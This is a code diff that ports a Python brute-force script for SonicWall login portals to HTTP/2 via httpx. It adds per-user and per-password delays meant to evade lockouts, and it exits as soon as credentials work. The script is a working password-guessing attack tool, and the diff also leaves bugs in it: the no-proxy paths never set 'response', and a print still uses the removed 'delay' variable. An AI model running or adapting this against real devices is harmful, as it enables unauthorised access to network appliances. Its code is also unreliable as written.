@@ -1,18 +1,14 @@
 #!/usr/bin/python3
 
-# Script to brute force logins on SonicWall
+# Script to brute force logins on SonicWall supporting HTTP/2
 #
-# Drew Kirkpatrick
-# drew.kirkpatrick@gmail.com
-# @hoodoer
+# 6sp33d@pm.me
+# @6sp33d
 #
 #
 # Based on:
 # https://gist.github.com/vasuman/fa750a6fe57fc8a73aff
-
-
-# Todo
-# multithreading/performance
+# https://github.com/hoodoer/sonicWallBruteForce
 
 
 import time
@@ -21,12 +17,7 @@ from hashlib import md5
 from html.parser import HTMLParser
 import sys
 import argparse
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-
-VERIFY = False
+import httpx
 
 
 class InputFieldParser(HTMLParser):
@@ -88,19 +79,21 @@ def make_form(p):
 # This should be what sets up our class
 def req_login_page():
     if proxy is None:
-        resp = requests.get(LOGIN_PORTAL, verify = VERIFY)
+        resp = httpx.Client(http2=True, verify=False)
+        resp.get(LOGIN_PORTAL)
     else:
-        resp = requests.get(LOGIN_PORTAL, verify = VERIFY, proxies=proxies)
+        resp = httpx.Client(http2=True, verify=False, proxies=proxies)
+        response = resp.get(LOGIN_PORTAL)
 
     if debug:
     	print("********************************************")
     	print("Parsing login page at: " + LOGIN_PORTAL)
-    	print("Login page response: " + str(resp.status_code))
-    	print("Login page content: " + str(resp.text))
+    	print("Login page response: " + str(response.status_code))
+    	print("Login page content: " + str(response.text))
     	print("********************************************")
 
     parser = InputFieldParser()
-    parser.feed(resp.text)
+    parser.feed(response.text)
 
     return parser
 
@@ -116,19 +109,21 @@ def do_login():
 
     # Check if we're using a proxy (e.g. Burp)
     if proxy is None:
-        login_req = requests.post(AUTH_PAGE, data = form, cookies = cookies, verify = VERIFY)
-    else:
-        login_req = requests.post(AUTH_PAGE, data = form, cookies = cookies, verify = VERIFY, proxies=proxies)
+        login_req = httpx.Client(http2=True, verify=False)
+        login_req.post(AUTH_PAGE, data = form, cookies = cookies)
 
-    if login_req.status_code != 200:
+    else:
+        login_req = httpx.Client(http2=True, verify=False, proxies=proxies)
+        response = login_req.post(AUTH_PAGE, data = form, cookies = cookies)
+
+    if response.status_code != 200:
         # Creds didn't work
         return False
-    if login_req.text.find('auth.html') != -1:
+    if response.text.find('auth.html') != -1:
         # Creds didn't work
         return False
 
     # If we're here, the creds worked
-    # <insert happy dance>
     return True
 
 
@@ -142,19 +137,21 @@ def main():
     parser.add_argument("-password", help="password to use (single).")
     parser.add_argument("-passwordlist", help="password list. Seriously consider setting a delay value.")
     parser.add_argument("-proxy", help="HTTP proxy.")
-    parser.add_argument("-delay", help="how many seconds to wait before moving to next password in list.")
+    parser.add_argument("-passdelay", help="how many seconds to wait before moving to next password in list.")
+    parser.add_argument("-userdelay", help="how many seconds to wait before moving to next user in list.")
     parser.add_argument("-debug", help="print extra stuffs.", action='store_true')
 
     args = parser.parse_args()
 
-    global host, userlist, password, passwordlist, proxy, proxies, delay, debug
+    global host, userlist, password, passwordlist, proxy, proxies, pass_delay,user_delay, debug
 
     host         = args.host
     userlist     = args.userlist
     password     = args.password
     passwordlist = args.passwordlist
     proxy        = args.proxy
-    delay        = args.delay
+    pass_delay   = args.passdelay
+    user_delay   = args.userdelay
     debug        = args.debug
 
     print("Sonic Wall brute force script\n")
@@ -162,7 +159,8 @@ def main():
     print("Host: " + str(host))
     print("userlist: " + str(userlist))
     print("password: " + str(password))
-    print("delay: " + str(delay))
+    print("pass_delay: " + str(pass_delay))
+    print("user_delay: " + str(user_delay))
     print("passwordlist: " + str(passwordlist))
     print("proxy: " + str(proxy))
     print("debug: " + str(debug))
@@ -173,8 +171,8 @@ def main():
     # Setup our proxy. Burp is a lovely choice. 
     if proxy != None:
         proxies = {
-        "http" : proxy,
-        "https" : proxy
+        "http://" : proxy,
+        "https://" : proxy
         }
 
 
@@ -234,15 +232,21 @@ def main():
 
             if do_login():
                 print("Winner winner chicken dinner (" + user + ":" + password + ")")
+                sys.exit(0)
             else:
-                if debug:
-                    print("Invalid credentials")
-                    print("Failed - (" + user + ":" + "password" + ")")
+                print("Invalid credentials")
+                print("Failed - (" + user + ":" + password + ")")
 
-        # Should we wait between password cycles? To avoid lockouts/blocking?
-        if delay is not None:
+            if user_delay is not None:
+            # Should we wait between users to avoid lockouts/blocking?
+                print("Pausing before next user")
+                time.sleep(int(user_delay))
+                print("\n")
+
+        # Should we wait between password cycles to avoid lockouts/blocking?
+        if pass_delay is not None:
             print("Password loop done, waiting " + str(delay) + " seconds...")
-            time.sleep(int(delay))
+            time.sleep(int(pass_delay))
 
     print("Done.")
 
